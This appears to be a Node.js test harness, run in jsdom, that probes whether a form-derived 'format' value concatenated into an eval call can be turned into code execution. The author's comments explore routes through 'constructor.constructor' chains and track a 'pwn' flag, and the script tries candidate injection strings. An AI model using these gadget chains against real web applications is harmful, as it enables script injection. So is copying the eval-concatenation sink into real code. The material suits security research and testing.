const fs = require("fs");
const { JSDOM } = require("jsdom");
const jq = fs.readFileSync(__dirname + "/jq371.js", "utf8");

function test(format) {
  const d = new JSDOM(
    `<form id="poly_x" data-formula="x"><input id="x_standard" name="x" value="1"><input id="y_standard" name="y" value="2"><input name="formula" value="x"><div id="template_standard"></div></form>`,
    { runScripts: "dangerously", pretendToBeVisual: true, url: "https://x/" });
  const w = d.window;
  const s = w.document.createElement("script"); s.textContent = jq; w.document.head.appendChild(s);
  const $ = w.$;
  const form = w.document.querySelector("form");
  form.id = "poly_" + format;
  const sel = form.id.replace("poly_", "");
  let r = { len: null, pwn: false };
  try {
    const T = $("#template_" + sel);
    r.len = T.length;
    if (T.length === 0) {
      w.__P__ = false;
      w.type_standard = function () { return 1; };
      try {
        w.eval("window.__run=function(selected){ return eval('type_'+selected+'(this, selected)'); }");
        const ans = w.__run.call(form, sel);
        r.pwn = !!w.__P__;
        r.ansType = typeof ans;
      } catch (e) { r.ev = e.message.split("\n")[0]; }
    }
  } catch (e) { r.se = e.message.split("\n")[0]; }
  return r;
}

// Goal: one-call execution. selected==format passed as arg2.
// Insight: `.call(this, selected)` on Function => Function(selected) returns fn (not run).
// To RUN in same expression we need the fn invoked. Try making the whole member value be a
// PROXY/getter? can't. Try: reach `document`/`window` via `this`(form) passed as arg1 to a fn
// that uses arg1... but we don't control that fn's body.
//
// NEW: `String.prototype.constructor` = String. Not exec.
// NEW: `Array.prototype.map` etc need arrays.
//
// The ONLY built-in that executes a string in ONE call ignoring/using thisArg is eval, reachable as
//   type_standard.constructor.constructor.call.call(eval,...)  -> too many parens.
//
// Reconsider: maybe we CAN reach a self-invoking pattern:
//   type_standard.constructor.constructor(this,selected) fails (arg1 param).
//   But .call(this,selected) => Function(selected). If selected body is "PAYLOAD", we then need ().
// What if selected, as a Function BODY, is never needed — instead we abuse that Function(selected)
//   is CALLED because the outer eval does `...(this,selected)` and we chained .call so the RESULT is
//   a function, then jQuery/somebody calls it? No.
//
// PIVOT: Accept two evaluations aren't available. Use `location`/`open` reachable from `this`(form)?
//   `this.ownerDocument.location` — but base is type_<format>, and `this` is only arg1.
//
// Actually: `(this, selected)` is arg list. What if format ends the call early and starts a NEW call?
//   Not with pure member chain.
//
// Test whether `.call` result being a function that we then need to run can be auto-run via
//  making selected end with `//` and rely on nothing. Confirm .call returns fn:
const cands = [
  "standard.constructor.constructor.call",      // Function(selected) -> fn (ansType function?)
  "standard.constructor.constructor.bind",      // bound Function -> fn
];
for (const c of cands) console.log(c, "=>", JSON.stringify(test(c)));
